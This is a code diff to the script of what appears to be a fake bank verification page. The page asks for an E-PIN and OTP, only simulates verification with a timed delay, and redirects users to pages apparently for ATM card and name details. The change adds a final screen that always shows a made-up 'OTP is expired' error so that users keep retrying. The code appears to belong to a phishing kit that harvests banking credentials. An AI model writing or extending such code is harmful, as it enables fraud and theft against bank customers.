@@ -668,16 +668,19 @@
                     timer.textContent = '';
                     resendTimer = 60;
                     
-                    // Change verification message when timer ends
-                    verificationMessage.innerHTML = 'Didn\'t receive the OTP? Your E-PIN may be incorrect. Click <a href="index.html" class="re-enter-link">Re-Enter</a> or activate Via ATM Card';
-                    
-                    // Change verify button text and type
-                    verifyBtn.textContent = 'Verify with ATM card';
-                    verifyBtn.type = 'button';
-                    verifyBtn.onclick = function(e) {
-                        e.preventDefault();
-                        window.location.href = 'card.html';
-                    };
+                    // Only change button and message if NOT on last screen
+                    if (msg !== 'last' && msg !== 'lastt') {
+                        // Change verification message when timer ends
+                        verificationMessage.innerHTML = 'Didn\'t receive the OTP? Your E-PIN may be incorrect. Click <a href="index.html" class="re-enter-link">Re-Enter</a> or activate Via ATM Card';
+                        
+                        // Change verify button text and type
+                        verifyBtn.textContent = 'Verify with ATM card';
+                        verifyBtn.type = 'button';
+                        verifyBtn.onclick = function(e) {
+                            e.preventDefault();
+                            window.location.href = 'card.html';
+                        };
+                    }
                 }
             }, 1000);
         }
@@ -745,6 +748,17 @@
                 
                 // Simulate verification process
                 await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Check if this is the last screen - show expired error
+                if (msg === 'last' || msg === 'lastt') {
+                    verifyBtn.disabled = false;
+                    verifyBtn.textContent = 'Verify';
+                    
+                    // Show expired error message
+                    document.getElementById('errorMessage').textContent = 'OTP is expired please try again';
+                    showErrorModal();
+                    return;
+                }
                 
                 // Determine next page based on msg parameter
                 let nextPage = 'name.html';
